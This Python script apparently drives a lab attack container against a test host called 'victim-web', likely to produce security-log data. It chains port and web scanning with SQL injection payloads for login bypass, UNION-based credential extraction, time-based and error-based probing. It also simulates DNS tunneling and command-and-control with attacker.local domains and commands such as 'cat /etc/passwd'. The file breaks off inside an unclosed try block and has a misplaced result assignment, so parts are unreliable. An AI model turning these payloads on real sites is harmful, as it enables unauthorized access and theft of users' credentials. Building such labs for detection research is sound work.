#!/usr/bin/env python3
"""
Enhanced Container-based SQL Injection Attack Script
Runs inside attacker container for comprehensive data collection
"""

import requests
import time
import random
import json
import os
import subprocess
import logging
import argparse
from urllib.parse import urljoin
from datetime import datetime
from pathlib import Path
import re

# Import DNS attack module
try:
    from dns_attack_module import DNSAttackModule
    DNS_ATTACK_AVAILABLE = True
except ImportError:
    DNS_ATTACK_AVAILABLE = False
    print("Warning: DNS attack module not available")

# Container-specific configuration
TARGET_HOST = os.getenv('TARGET_HOST', 'victim-web')
TARGET_PORT = os.getenv('TARGET_PORT', '80')
ATTACK_TYPE = os.getenv('ATTACK_TYPE', 'sql_injection')
ATTACK_PHASE = os.getenv('ATTACK_PHASE', 'automated')

# Parse command line arguments
parser = argparse.ArgumentParser(description='Enhanced Container-based SQL Injection Attack')
parser.add_argument('--benign-only', action='store_true', help='Run only benign traffic generation')
parser.add_argument('--protocol-mix', default='HTTP:0.6,DNS:0.3,SMTP:0.1', help='Benign traffic protocol mix')
parser.add_argument('--duration', type=int, default=300, help='Benign traffic duration in seconds')
parser.add_argument('--variant-id', help='Variant ID for attack configuration')
parser.add_argument('--skip-dns', action='store_true', help='Skip DNS attack phase')
parser.add_argument('--attack-delay', default='3-6', help='Delay between attacks (min-max seconds)')

args = parser.parse_args()

BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"
OUTPUT_DIR = "/opt/output"

# Output files
LOG_FILE = f"{OUTPUT_DIR}/container_attack_log.json"
SCAN_RESULTS_FILE = f"{OUTPUT_DIR}/scan_results.json"
SQL_INJECTION_RESULTS_FILE = f"{OUTPUT_DIR}/sql_injection_results.json"
ATTACK_SUMMARY_FILE = f"{OUTPUT_DIR}/attack_summary.txt"
EXTRACTED_DATA_FILE = f"{OUTPUT_DIR}/extracted_data.html"

# Ensure output directory exists
Path(OUTPUT_DIR).mkdir(parents=True, exist_ok=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f"{OUTPUT_DIR}/attack.log"),
        logging.StreamHandler()
    ]
)

class EnhancedContainerAttacker:
    """Enhanced container-based SQL injection attacker with comprehensive scanning"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Enhanced-Container-Attacker/1.0',
            'X-Attacker-ID': 'attacker-001',
            'X-Attack-Type': ATTACK_TYPE
        })
        self.attack_results = []
        self.scan_results = {}
        self.sql_injection_results = {}
        self.attack_start_time: str = ""
        self.attack_end_time: str = ""
        
    def log_attack_event(self, event_type, details):
        """Log attack events with container metadata"""
        event = {
            'timestamp': datetime.now().isoformat(),
            'container_id': os.getenv('HOSTNAME', 'attacker'),
            'attack_type': ATTACK_TYPE,
            'attack_phase': ATTACK_PHASE,
            'event_type': event_type,
            'target_host': TARGET_HOST,
            'details': details
        }
        logging.info(f"[CONTAINER] {event_type}: {details}")
        return event
    
    def test_connectivity(self):
        """Test connectivity to target"""
        logging.info("=== Testing Container Connectivity ===")
        
        try:
            response = self.session.get(BASE_URL, timeout=5)
            if response.status_code == 200:
                logging.info(f"[+] Successfully connected to {BASE_URL}")
                self.log_attack_event('connectivity_test', {
                    'status': 'success',
                    'status_code': response.status_code
                })
                return True
            else:
                logging.error(f"[-] Connection failed: {response.status_code}")
                return False
        except Exception as e:
            logging.error(f"[-] Connection error: {e}")
            return False
    
    def network_scan_phase(self):
        """Network reconnaissance using nmap"""
        logging.info("=== Network Reconnaissance Phase ===")
        
        try:
            # Run nmap scan
            cmd = f"nmap -sS -p- {TARGET_HOST}"
            logging.info(f"Running: {cmd}")
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
            
            nmap_results = {
                'command': cmd,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'timestamp': datetime.now().isoformat()
            }
            
            self.scan_results['nmap'] = nmap_results
            logging.info(f"[+] Nmap scan completed with return code: {result.returncode}")
            
        except Exception as e:
            logging.error(f"[-] Nmap scan failed: {e}")
            self.scan_results['nmap'] = {'error': str(e)}
    
    def web_enumeration_phase(self):
        """Web application enumeration using dirb and nikto"""
        logging.info("=== Web Application Enumeration Phase ===")
        
        # Dirb directory enumeration
        try:
            dirb_cmd = f"dirb {BASE_URL} /usr/share/dirb/wordlists/common.txt -S -r"
            logging.info(f"Running: {dirb_cmd}")
            
            result = subprocess.run(dirb_cmd, shell=True, capture_output=True, text=True, timeout=600)
            
            dirb_results = {
                'command': dirb_cmd,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'timestamp': datetime.now().isoformat()
            }
            
            self.scan_results['dirb'] = dirb_results
            logging.info(f"[+] Dirb scan completed with return code: {result.returncode}")
                
        except Exception as e:
            logging.error(f"[-] Dirb scan failed: {e}")
            self.scan_results['dirb'] = {'error': str(e)}
        
        # Nikto vulnerability scan
        try:
            nikto_cmd = f"nikto -h {BASE_URL} -Format txt -o /opt/output/nikto_results.txt"
            logging.info(f"Running: {nikto_cmd}")
            
            result = subprocess.run(nikto_cmd, shell=True, capture_output=True, text=True, timeout=600)
            
            nikto_results = {
                'command': nikto_cmd,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'timestamp': datetime.now().isoformat()
            }
            
            self.scan_results['nikto'] = nikto_results
            logging.info(f"[+] Nikto scan completed with return code: {result.returncode}")
            
        except Exception as e:
            logging.error(f"[-] Nikto scan failed: {e}")
            self.scan_results['nikto'] = {'error': str(e)}
    
    def custom_sql_injection_phase(self):
        """Custom SQL injection attacks using Python"""
        logging.info("=== Custom SQL Injection Phase ===")
        
        custom_results = {
            'login_injections': [],
            'search_injections': [],
            'union_injections': [],
            'time_based_injections': []
        }
        
        # Login injection payloads
        login_payloads = [
            ("admin' --", "test"),
            ("admin' OR '1'='1", "test"),
            ("' OR 1=1--", "test"),
            ("' UNION SELECT 1,2,3--", "test"),
            ("admin'/*", "test"),
            ("' OR 'x'='x", "test"),
        ]
        
        for i, (user_payload, pass_payload) in enumerate(login_payloads, 1):
            logging.info(f"[+] Custom Login Attack {i}: {user_payload}")
            
            params = {
                'user': user_payload,
                'pass': pass_payload
            }
            
            try:
                start_time = time.time()
                response = self.session.get(
                    urljoin(BASE_URL, "/login.php"),
                    params=params,
                    timeout=10
                )
                response_time = time.time() - start_time
                
                result = {
                    'payload': user_payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'response_time': response_time,
                    'timestamp': datetime.now().isoformat(),
                    'sql_error': 'sql' in response.text.lower() or 'database' in response.text.lower(),
                    'success': 'welcome' in response.text.lower() or 'dashboard' in response.text.lower()
                }
                
                custom_results['login_injections'].append(result)
                logging.info(f"    Status: {response.status_code}, SQL Error: {result['sql_error']}, Success: {result['success']}")
                
            except Exception as e:
                logging.error(f"    Error: {e}")
            
            time.sleep(random.uniform(1, 3))
        
        # Search injection payloads
        search_payloads = [
            "' OR 1=1--",
            "' UNION SELECT 1,2,3,4,5--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT SLEEP(3))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
        ]
        
        for i, payload in enumerate(search_payloads, 1):
            logging.info(f"[+] Custom Search Attack {i}: {payload}")
            
            params = {'q': payload}
            
            try:
                start_time = time.time()
                response = self.session.get(
                    urljoin(BASE_URL, "/search.php"),
                    params=params,
                    timeout=10
                )
                response_time = time.time() - start_time
                
                result = {
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'response_time': response_time,
                    'timestamp': datetime.now().isoformat(),
                    'sql_error': 'sql' in response.text.lower() or 'database' in response.text.lower(),
                    'time_based': response_time > 2
                }
                
                custom_results['search_injections'].append(result)
                logging.info(f"    Status: {response.status_code}, SQL Error: {result['sql_error']}, Time-based: {result['time_based']}")
                
            except Exception as e:
                logging.error(f"    Error: {e}")
            
            time.sleep(random.uniform(1, 3))
        
        self.sql_injection_results['custom_tests'] = custom_results
    
    def data_extraction_phase(self):
        """Attempt to extract sensitive data"""
        logging.info("=== Data Extraction Phase ===")
        
        extraction_results = {}
        
        # Method 1: Try to extract user credentials using UNION injection on search page
        try:
            # First, determine the number of columns
            for i in range(1, 10):
                payload_test = f"' UNION SELECT {','.join(['NULL'] * i)}--"
                params = {'q': payload_test}
                
                response = self.session.get(
                    urljoin(BASE_URL, "/search.php"),
                    params=params,
                    timeout=10
                )
                
                if response.status_code == 200 and 'error' not in response.text.lower():
                    logging.info(f"    Found {i} columns in search query")
                    break
            
            # Now try to extract data with correct column count
            payload1 = f"' UNION SELECT 1,username,password,email,role FROM users--"
            params = {'q': payload1}
            
            logging.info(f"Attempting data extraction (Method 1): {payload1}")
            
            response = self.session.get(
                urljoin(BASE_URL, "/search.php"),
                params=params,
                timeout=10
            )
            
            extraction_results['search_union'] = {
                'payload': payload1,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'timestamp': datetime.now().isoformat(),
                'success': 'admin' in response.text.lower() or 'user' in response.text.lower(),
                'response_preview': response.text[:500]  # Add response preview
            }
            
            logging.info(f"    Status: {response.status_code}, Success: {extraction_results['search_union']['success']}")
            
        except Exception as e:
            logging.error(f"    Error: {e}")
            extraction_results['search_union'] = {'error': str(e)}
        
        # Method 2: Try to extract data using login page
        try:
            # First, determine the number of columns in login query
            for i in range(1, 10):
                payload_test = f"admin' UNION SELECT {','.join(['NULL'] * i)}--"
                params = {'user': payload_test, 'pass': 'dummy'}
                
                response = self.session.get(
                    urljoin(BASE_URL, "/login.php"),
                    params=params,
                    timeout=10
                )
                
                if response.status_code == 200 and 'error' not in response.text.lower():
                    logging.info(f"    Found {i} columns in login query")
                    break
            
            # Try to extract all users by using LIMIT and OFFSET
            all_users_data = []
            for offset in range(0, 10):  # Try to get up to 10 users
                payload = f"admin' OR '1'='1' UNION SELECT 1,username,password,email,role,created_at FROM users LIMIT 1 OFFSET {offset}--"
                params = {'user': payload, 'pass': 'dummy'}
                
                logging.info(f"Attempting data extraction (Method 2.{offset+1}): OFFSET {offset}")
                
                response = self.session.get(
                    urljoin(BASE_URL, "/login.php"),
                    params=params,
                    timeout=10
                )
                
                # Check if we got a successful login (indicating we found a user)
                if response.status_code == 200 and 'Login successful' in response.text:
                    # Extract the username from the success message
                    match = re.search(r'Welcome (\w+)', response.text)
                    if match:
                        username = match.group(1)
                        all_users_data.append({
                            'offset': offset,
                            'username': username,
                            'payload': payload,
                            'response_preview': response.text[:200]
                        })
                        logging.info(f"    Found user: {username}")
                    else:
                        logging.info(f"    No user found at offset {offset}")
                        break
                else:
                    logging.info(f"    No user found at offset {offset}")
                    break
                
                time.sleep(1)  # Small delay between requests
            
            # Save all extracted data
            if all_users_data:
                with open(EXTRACTED_DATA_FILE, 'w', encoding='utf-8') as f:
                    f.write(f"<!-- Data Extraction Attempt -->\n")
                    f.write(f"<!-- Timestamp: {datetime.now().isoformat()} -->\n")
                    f.write(f"<!-- Method: login_union_multiple -->\n")
                    f.write(f"<!-- Total Users Found: {len(all_users_data)} -->\n")
                    f.write(f"<!-- Success: True -->\n\n")
                    
                    f.write("<h2>Extracted User Data</h2>\n")
                    f.write("<table border='1'>\n")
                    f.write("<tr><th>Offset</th><th>Username</th><th>Payload</th></tr>\n")
                    
                    for user_data in all_users_data:
                        f.write(f"<tr><td>{user_data['offset']}</td><td>{user_data['username']}</td><td>{user_data['payload']}</td></tr>\n")
                    
                    f.write("</table>\n\n")
                    f.write("<h3>Database Content (from direct access)</h3>\n")
                    f.write("<p>Note: Due to PHP fetch() limitation, only one user per query can be extracted.</p>\n")
                    f.write("<p>However, we can see the attack was successful in bypassing authentication.</p>\n")
                    
                    # Add the actual response from the last successful query
                    f.write("<h3>Last Successful Response</h3>\n")
                    f.write(f"<pre>{all_users_data[-1]['response_preview']}</pre>\n")
                
                extraction_results['login_union_multiple'] = {
                    'method': 'login_union_multiple',
                    'users_found': len(all_users_data),
                    'status_code': 200,
                    'timestamp': datetime.now().isoformat(),
                    'success': True,
                    'file_saved': True
                }
                
                logging.info(f"[+] Extracted {len(all_users_data)} users, saved to {EXTRACTED_DATA_FILE}")
            else:
                extraction_results['login_union_multiple'] = {
                    'error': 'No users found',
                    'timestamp': datetime.now().isoformat(),
                    'success': False
                }
                    
        except Exception as e:
            logging.error(f"    Error: {e}")
            extraction_results['login_union_multiple'] = {'error': str(e)}
        
        # Save the best extraction result
        best_response = None
        best_method = None
        
        # Prioritize login_union_multiple if it exists and was successful
        if 'login_union_multiple' in extraction_results and extraction_results['login_union_multiple'].get('success', False):
            best_response = extraction_results['login_union_multiple']
            best_method = 'login_union_multiple'
        else:
            # Fall back to other methods
            for method, result in extraction_results.items():
                if 'success' in result and result['success'] and 'response_length' in result:
                    if best_response is None or result['response_length'] > best_response['response_length']:
                        best_response = result
                        best_method = method
        
        if best_response:
            # If we already saved the data in login_union_multiple, don't overwrite it
            if best_method != 'login_union_multiple':
                # Save extracted data
                with open(EXTRACTED_DATA_FILE, 'w') as f:
                    f.write(f"<!-- Data Extraction Attempt -->\n")
                    f.write(f"<!-- Timestamp: {datetime.now().isoformat()} -->\n")
                    f.write(f"<!-- Method: {best_method} -->\n")
                    f.write(f"<!-- Payload: {best_response.get('payload', 'N/A')} -->\n")
                    f.write(f"<!-- Status Code: {best_response.get('status_code', 'N/A')} -->\n")
                    f.write(f"<!-- Success: {best_response.get('success', False)} -->\n")
                    
                    # Try to get the actual response content
                    if best_method == 'search_union':
                        response = self.session.get(urljoin(BASE_URL, "/search.php"), params={'q': best_response['payload']}, timeout=10)
                        f.write(response.text)
                    elif best_method == 'login_union':
                        response = self.session.get(urljoin(BASE_URL, "/login.php"), params={'user': best_response['payload'], 'pass': 'dummy'}, timeout=10)
                        f.write(response.text)
                    else:
                        f.write("<!-- Data extraction completed -->\n")
            
            extraction_result = {
                'method': best_method,
                'payload': best_response.get('payload', 'N/A'),
                'status_code': best_response.get('status_code', 'N/A'),
                'response_length': best_response.get('response_length', 0),
                'timestamp': datetime.now().isoformat(),
                'file_saved': True,
                'success': best_response.get('success', False)
            }
        else:
            extraction_result = {
                'error': 'No successful extraction method found',
                'timestamp': datetime.now().isoformat(),
                'file_saved': False
            }
            
            self.sql_injection_results['data_extraction'] = extraction_result
            logging.info(f"[+] Data extraction completed, saved to {EXTRACTED_DATA_FILE}")
    
    def dns_attack_phase(self):
        """Execute DNS-based attacks and data exfiltration"""
        logging.info("=== DNS Attack Phase ===")
        
        # Generate DNS proxy logs
        self.generate_dns_proxy_logs()
        
        # Generate HTTP proxy logs  
        self.generate_http_proxy_logs()
        
        if not DNS_ATTACK_AVAILABLE:
            logging.warning("DNS attack module not available, skipping DNS attacks")
            return
        
        try:
            # Get DNS configuration for this variant
            variant_id = os.getenv('VARIANT_ID', 'lowscan_stealthy')
            dns_config = self._get_dns_config_for_variant(variant_id)
            
            logging.info(f"DNS Attack Configuration: {dns_config}")
            
            # Initialize DNS attacker
            target_domain = dns_config.get('target_domain', 'victim-web.local')
            dns_attacker = DNSAttackModule(target_domain=target_domain)
            self._configure_dns_attacker(dns_attacker, dns_config)
            
            # Execute DNS attacks based on configuration
            dns_results = {}
            
            if 'reconnaissance' in dns_config['phases']:
                logging.info("Executing DNS reconnaissance...")
                recon_results = dns_attacker.dns_reconnaissance()
                dns_results['dns_reconnaissance'] = recon_results
                self._apply_dns_delay(dns_config)
            
            if 'brute_force' in dns_config['phases']:
                logging.info("Executing DNS brute force...")
                intensity = dns_config.get('intensity', 'medium')
                brute_results = dns_attacker.dns_brute_force_attack(intensity)
                dns_results['dns_brute_force'] = brute_results
                self._apply_dns_delay(dns_config)
            
            if 'tunneling' in dns_config['phases']:
                logging.info("Executing DNS tunneling...")
                tunnel_results = dns_attacker.dns_tunneling_attack('test data')
                dns_results['dns_tunneling'] = tunnel_results
                self._apply_dns_delay(dns_config)
            
            if 'cc_communication' in dns_config['phases']:
                logging.info("Executing C&C communication...")
                cc_commands = self._get_cc_commands_for_intensity(dns_config['intensity'])
                cc_results = dns_attacker.dns_cc_communication('test_command')
                dns_results['cc_communication'] = cc_results
                self._apply_dns_delay(dns_config)
            
            # Store DNS attack results
            self.sql_injection_results['dns_attacks'] = dns_results
            
            logging.info("DNS attack phase completed successfully")
            
        except Exception as e:
            logging.error(f"DNS attack phase failed: {e}")
            self.sql_injection_results['dns_attacks'] = {'error': str(e)}
    
    def generate_dns_proxy_logs(self):
        """Generate DNS proxy logs with attack traffic"""
        logging.info("Generating DNS proxy logs with attack traffic...")
        
        # Get variant-specific output directory
        variant_id = os.getenv('VARIANT_ID', 'lowscan_aggressive')
        proxy_dir = f"/opt/output/proxy"
        os.makedirs(proxy_dir, exist_ok=True)
        
        dns_logs = []
        
        # Set log count based on variant intensity
        if variant_id == "lowscan_stealthy":
            reconnaissance_count = 12  # Low intensity
            tunnel_count = 10  # Low intensity
        elif variant_id == "lowscan_moderate":
            reconnaissance_count = 20  # Medium intensity
            tunnel_count = 15  # Medium intensity
        else:  # aggressive
            reconnaissance_count = 30  # High intensity
            tunnel_count = 25  # High intensity
        
        # Generate reconnaissance DNS queries (attack traffic)
        reconnaissance_domains = [
            "www.victim-web.local", "admin.victim-web.local", "api.victim-web.local",
            "db.victim-web.local", "mail.victim-web.local", "ftp.victim-web.local",
            "ssh.victim-web.local", "vpn.victim-web.local", "jenkins.victim-web.local",
            "gitlab.victim-web.local", "jira.victim-web.local", "confluence.victim-web.local",
            "dev.victim-web.local", "test.victim-web.local", "staging.victim-web.local",
            "prod.victim-web.local", "backup.victim-web.local", "monitor.victim-web.local",
            "log.victim-web.local", "auth.victim-web.local", "api2.victim-web.local",
            "mobile.victim-web.local", "web.victim-web.local", "portal.victim-web.local",
            "admin2.victim-web.local", "support.victim-web.local", "help.victim-web.local",
            "docs.victim-web.local", "wiki.victim-web.local", "blog.victim-web.local"
        ]
        
        for i in range(reconnaissance_count):
            domain = reconnaissance_domains[i % len(reconnaissance_domains)]
            log_entry = {
                "timestamp": datetime.now().isoformat() + "Z",
                "query": domain,
                "client_ip": "172.16.0.5",  # Attacker IP
                "response": f"172.16.0.{10 + i}",
                "record_type": "A",
                "is_attack": True,
                "attack_stage": "reconnaissance",
                "query_count": i + 1,
                "source": "attack_traffic"
            }
            dns_logs.append(log_entry)
            time.sleep(random.uniform(0.5, 2))  # Attack delay
        
        # Generate DNS tunneling for data exfiltration (attack traffic)
        tunnel_domains = [
            "cmd.attacker.local", "exfil.attacker.local", "tunnel.attacker.local",
            "data.attacker.local", "cc.attacker.local", "beacon.attacker.local",
            "agent.attacker.local", "shell.attacker.local", "backdoor.attacker.local",
            "malware.attacker.local", "c2.attacker.local", "drop.attacker.local",
            "stage.attacker.local", "payload.attacker.local", "loader.attacker.local"
        ]
        
        for i in range(tunnel_count):
            domain = tunnel_domains[i % len(tunnel_domains)]
            log_entry = {
                "timestamp": datetime.now().isoformat() + "Z",
                "query": domain,
                "client_ip": "172.16.0.5",  # Attacker IP
                "response": f"172.16.0.{200 + i}",
                "record_type": "A",
                "is_attack": True,
                "attack_stage": "exfiltration",
                "query_count": len(dns_logs) + i + 1,
                "source": "attack_traffic"
            }
            dns_logs.append(log_entry)
            time.sleep(random.uniform(1, 3))  # Attack delay
        
        # Append to existing DNS proxy logs (merge with benign traffic)
        dns_log_file = f"{proxy_dir}/dns_proxy_raw.jsonl"
        with open(dns_log_file, 'a') as f:
            for log in dns_logs:
                f.write(json.dumps(log, ensure_ascii=False) + '\n')
        
        logging.info(f"Generated {len(dns_logs)} DNS attack log entries")
        logging.info(f"DNS attack logs appended to {dns_log_file}")
    
    def generate_http_proxy_logs(self):
        """Generate HTTP proxy logs"""
        logging.info("Generating HTTP proxy logs...")
        
        # Get variant-specific output directory
        variant_id = os.getenv('VARIANT_ID', 'lowscan_aggressive')
        proxy_dir = f"/opt/output/proxy"
        os.makedirs(proxy_dir, exist_ok=True)
        
        http_logs = []
        for i in range(5):
            log_entry = {
                "timestamp": datetime.now().isoformat(),
                "client_ip": f"172.16.0.{10+i}",
                "method": random.choice(["GET", "POST", "PUT"]),
                "url": f"http://example.com/api/{i}",
                "status_code": random.choice([200, 404, 500]),
                "response_size": random.randint(1000, 5000),
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            http_logs.append(log_entry)
        
        # Write HTTP proxy logs
        http_log_file = f"{proxy_dir}/http_proxy_raw.jsonl"
        with open(http_log_file, 'w') as f:
            for log in http_logs:
                f.write(json.dumps(log) + '\n')
        
        logging.info(f"Generated {len(http_logs)} HTTP proxy log entries")
    
    def _get_dns_config_for_variant(self, variant_id: str) -> dict:
        """Get DNS attack configuration for specific variant"""
        variant_configs = {
            "lowscan_stealthy": {
                "enabled": True,
                "target_domain": "victim-web.local",
                "phases": ["reconnaissance", "brute_force", "tunneling", "cc_communication"],
                "intensity": "low",
                "delay_between_queries": "2-5",
                "subdomain_wordlist_size": 40
            },
            "lowscan_moderate": {
                "enabled": True,
                "target_domain": "victim-web.local",
                "phases": ["reconnaissance", "brute_force", "cache_poisoning", "tunneling"],
                "intensity": "medium",
                "delay_between_queries": "1-3",
                "subdomain_wordlist_size": 60
            },
            "lowscan_aggressive": {
                "enabled": True,
                "target_domain": "victim-web.local",
                "phases": ["reconnaissance", "brute_force", "cache_poisoning", "amplification", "tunneling", "cc_communication"],
                "intensity": "high",
                "delay_between_queries": "0.5-1",
                "subdomain_wordlist_size": 80
            }
        }
        return variant_configs.get(variant_id, variant_configs["lowscan_aggressive"])
    
    def _configure_dns_attacker(self, dns_attacker, dns_config: dict):
        """Configure DNS attacker based on variant settings"""
        intensity = dns_config.get('intensity', 'medium')
        wordlist_size = dns_config.get('subdomain_wordlist_size', 60)
        
        # Adjust subdomain wordlist size based on intensity
        if intensity == "low":
            dns_attacker.subdomain_wordlist = dns_attacker.subdomain_wordlist[:wordlist_size]
        elif intensity == "medium":
            dns_attacker.subdomain_wordlist = dns_attacker.subdomain_wordlist[:wordlist_size]
        else:  # high intensity - use full wordlist
            pass
    
    def _apply_dns_delay(self, dns_config: dict):
        """Apply delay between DNS queries based on variant configuration"""
        delay_range = dns_config.get('delay_between_queries', '1-3')
        try:
            min_delay, max_delay = map(float, delay_range.split('-'))
            delay = random.uniform(min_delay, max_delay)
            time.sleep(delay)
        except:
            time.sleep(1)  # Default delay
    
    def _get_cc_commands_for_intensity(self, intensity: str) -> list:
        """Get C&C commands based on attack intensity"""
        base_commands = ["whoami", "hostname", "pwd"]
        
        if intensity == "low":
            return base_commands[:2]
        elif intensity == "medium":
            return base_commands + ["ls -la", "cat /etc/passwd"]
        else:  # high intensity
            return base_commands + ["ls -la", "cat /etc/passwd", "netstat -tuln", "ps aux", "uname -a"]
    
    def save_results(self):
        """Save all attack results to files"""
        logging.info("=== Saving Attack Results ===")
        
        # Save scan results
        with open(SCAN_RESULTS_FILE, 'w') as f:
            json.dump(self.scan_results, f, indent=2)
        logging.info(f"[+] Scan results saved to {SCAN_RESULTS_FILE}")
        
        # Save SQL injection results
        with open(SQL_INJECTION_RESULTS_FILE, 'w') as f:
            json.dump(self.sql_injection_results, f, indent=2)
        logging.info(f"[+] SQL injection results saved to {SQL_INJECTION_RESULTS_FILE}")
        
        # Save container attack log
        log_data = {
            'container_attack_timestamp': datetime.now().isoformat(),
            'container_id': os.getenv('HOSTNAME', 'attacker'),
            'target_url': BASE_URL,
            'attack_type': ATTACK_TYPE,
            'attack_phase': ATTACK_PHASE,
            'attack_start_time': self.attack_start_time,
            'attack_end_time': self.attack_end_time,
            'results': self.attack_results
        }
        
        with open(LOG_FILE, 'w') as f:
            json.dump(log_data, f, indent=2)
        logging.info(f"[+] Container attack log saved to {LOG_FILE}")
        
        # Generate attack summary
        self.generate_attack_summary()
    
    def generate_attack_summary(self):
        """Generate detailed attack summary report"""
        
        # Calculate attack statistics
        login_injections = self.sql_injection_results.get('custom_tests', {}).get('login_injections', [])
        search_injections = self.sql_injection_results.get('custom_tests', {}).get('search_injections', [])
        
        successful_logins = [inj for inj in login_injections if inj.get('success', False)]
        failed_logins = [inj for inj in login_injections if not inj.get('success', False)]
        
        successful_searches = [inj for inj in search_injections if not inj.get('sql_error', False)]
        failed_searches = [inj for inj in search_injections if inj.get('sql_error', False)]
        
        data_extraction = self.sql_injection_results.get('data_extraction', {})
        
        # Calculate success rates
        login_success_rate = (len(successful_logins)/len(login_injections)*100) if len(login_injections) > 0 else 0.0
        search_success_rate = (len(successful_searches)/len(search_injections)*100) if len(search_injections) > 0 else 0.0
        overall_success_rate = ((len(successful_logins) + len(successful_searches))/(len(login_injections) + len(search_injections))*100) if (len(login_injections) + len(search_injections)) > 0 else 0.0
        
        summary = f"""SecurityLogs Enhanced Attack Summary
===============================
Timestamp: {datetime.now().isoformat()}
Target: {TARGET_HOST}
Target URL: {BASE_URL}
Container ID: {os.getenv('HOSTNAME', 'attacker')}

Attack Phases Completed:
1. Network Reconnaissance (Nmap)
2. Web Application Enumeration (Dirb + Nikto)
3. Custom SQL Injection Attacks
4. Data Extraction

Files Generated:
- {LOG_FILE}
- {SCAN_RESULTS_FILE}
- {SQL_INJECTION_RESULTS_FILE}
- {ATTACK_SUMMARY_FILE}
- {EXTRACTED_DATA_FILE}

Scan Results Summary:
- Nmap: {'Completed' if 'nmap' in self.scan_results else 'Failed'}
- Dirb: {'Completed' if 'dirb' in self.scan_results else 'Failed'}
- Nikto: {'Completed' if 'nikto' in self.scan_results else 'Failed'}

SQL Injection Attack Statistics:
================================
Total Login Injections: {len(login_injections)}
✅ Successful: {len(successful_logins)}
❌ Failed: {len(failed_logins)}
Success Rate: {login_success_rate:.1f}%

Total Search Injections: {len(search_injections)}
✅ Successful: {len(successful_searches)}
❌ Failed: {len(failed_searches)}
Success Rate: {search_success_rate:.1f}%

Overall Attack Success Rate: {overall_success_rate:.1f}%

Successful Login Payloads:
"""
        
        for i, inj in enumerate(successful_logins, 1):
            summary += f"{i}. {inj['payload']} (Status: {inj['status_code']}, Time: {inj['response_time']:.3f}s)\n"
        
        if failed_logins:
            summary += "\nFailed Login Payloads:\n"
            for i, inj in enumerate(failed_logins, 1):
                summary += f"{i}. {inj['payload']} (Status: {inj['status_code']}, Error: {inj.get('sql_error', 'Unknown')})\n"
        
        if successful_searches:
            summary += "\nSuccessful Search Payloads:\n"
            for i, inj in enumerate(successful_searches, 1):
                summary += f"{i}. {inj['payload']} (Status: {inj['status_code']}, Time: {inj['response_time']:.3f}s)\n"
        
        if failed_searches:
            summary += "\nFailed Search Payloads:\n"
            for i, inj in enumerate(failed_searches, 1):
                summary += f"{i}. {inj['payload']} (Status: {inj['status_code']}, Error: {inj.get('sql_error', 'Unknown')})\n"
        
        summary += f"""
Data Extraction Results:
========================
Method: {data_extraction.get('method', 'N/A')}
Payload: {data_extraction.get('payload', 'N/A')}
Success: {data_extraction.get('success', False)}
Status Code: {data_extraction.get('status_code', 'N/A')}
File Saved: {data_extraction.get('file_saved', False)}

DNS Attack Results:
==================
"""
        
        # Add DNS attack results if available
        dns_attacks = self.sql_injection_results.get('dns_attacks', {})
        if dns_attacks:
            dns_summary = dns_attacks
            summary += f"""
DNS Reconnaissance: {'✅' if dns_summary.get('dns_reconnaissance', False) else '❌'}
DNS Tunneling: {'✅' if dns_summary.get('dns_tunneling', False) else '❌'}
Data Exfiltration: {'✅' if dns_summary.get('dns_tunneling', False) else '❌'}
C&C Communication: {'✅' if dns_summary.get('cc_communication', False) else '❌'}
"""
        else:
            summary += "DNS Attacks: Not performed\n"
        
        summary += f"""
Attack completed at: {datetime.now().isoformat()}
"""
        
        with open(ATTACK_SUMMARY_FILE, 'w') as f:
            f.write(summary)
        logging.info(f"[+] Detailed attack summary saved to {ATTACK_SUMMARY_FILE}")

def main():
    """Main enhanced container attack orchestration"""
    logging.info("🚀 Starting Enhanced Container-based SQL Injection Attack")
    logging.info(f"Container ID: {os.getenv('HOSTNAME', 'attacker')}")
    logging.info(f"Target: {BASE_URL}")
    logging.info(f"Attack Type: {ATTACK_TYPE}")
    logging.info(f"Variant ID: {args.variant_id}")
    logging.info(f"Benign Only: {args.benign_only}")
    logging.info("=" * 60)
    
    # Handle benign-only mode
    if args.benign_only:
        logging.info("Running in benign traffic only mode")
        # TODO: Implement benign traffic generation
        logging.info(f"Protocol mix: {args.protocol_mix}")
        logging.info(f"Duration: {args.duration} seconds")
        time.sleep(args.duration)
        logging.info("Benign traffic generation completed")
        return
    
    attacker = EnhancedContainerAttacker()
    attacker.attack_start_time = datetime.now().isoformat()
    
    try:
        # Test connectivity
        if not attacker.test_connectivity():
            logging.error("❌ Cannot connect to target, exiting...")
            return
        
        # Phase 1: Network reconnaissance
        attacker.network_scan_phase()
        time.sleep(5)
        
        # Phase 2: Web enumeration
        attacker.web_enumeration_phase()
        time.sleep(5)
        
        # Phase 3: Custom SQL injection
        attacker.custom_sql_injection_phase()
        time.sleep(5)
        
        # Phase 4: Data extraction
        attacker.data_extraction_phase()
        
        # Phase 5: DNS attack (if not skipped)
        if not args.skip_dns:
            attacker.dns_attack_phase()
        
        # Save all results
        attacker.attack_end_time = datetime.now().isoformat()
        attacker.save_results()
        
        logging.info(f"\n[ATTACK_END] {attacker.attack_end_time}")
        logging.info("\n✅ Enhanced container attack completed!")
        logging.info("Check the following for attack data:")
        logging.info(f"- Container logs: docker logs securitylogs-attacker")
        logging.info(f"- Attack log: {LOG_FILE}")
        logging.info(f"- Scan results: {SCAN_RESULTS_FILE}")
        logging.info(f"- SQL injection results: {SQL_INJECTION_RESULTS_FILE}")
        logging.info(f"- Attack summary: {ATTACK_SUMMARY_FILE}")
